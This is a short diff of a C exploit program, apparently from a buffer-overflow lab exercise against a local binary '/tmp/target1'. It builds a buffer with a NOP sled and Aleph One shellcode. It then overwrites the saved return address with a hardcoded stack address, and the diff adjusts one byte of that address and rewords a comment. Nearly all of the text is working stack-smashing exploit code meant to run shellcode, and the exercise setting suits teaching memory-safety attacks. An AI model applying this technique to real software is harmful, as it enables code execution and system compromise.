@@ -4,8 +4,8 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/tmp/target1"
-#define NOOP 0x90
+#define TARGET 	"/tmp/target1"
+#define NOOP 	0x90
 
 int main(void)
 {
@@ -20,8 +20,8 @@ int main(void)
   //2. add shellcode from alephone 
   strncpy(buf + 180, shellcode, 45);
 
-  //3. overwrite the eip so that it points to somewhere in noop. we got this from esp/epb of foo where buffer is allocated 
-  strncpy(buf + 244, "\x08", 1);
+  //3. overwrite the eip so that it points to somewhere in buffer region containng noop. we got this buffer address from esp/epb of foo where buffer is allocated 
+  strncpy(buf + 244, "\x20", 1);
   strncpy(buf + 245, "\xfd", 1);
   strncpy(buf + 246, "\xff", 1);
   strncpy(buf + 247, "\xbf", 1);
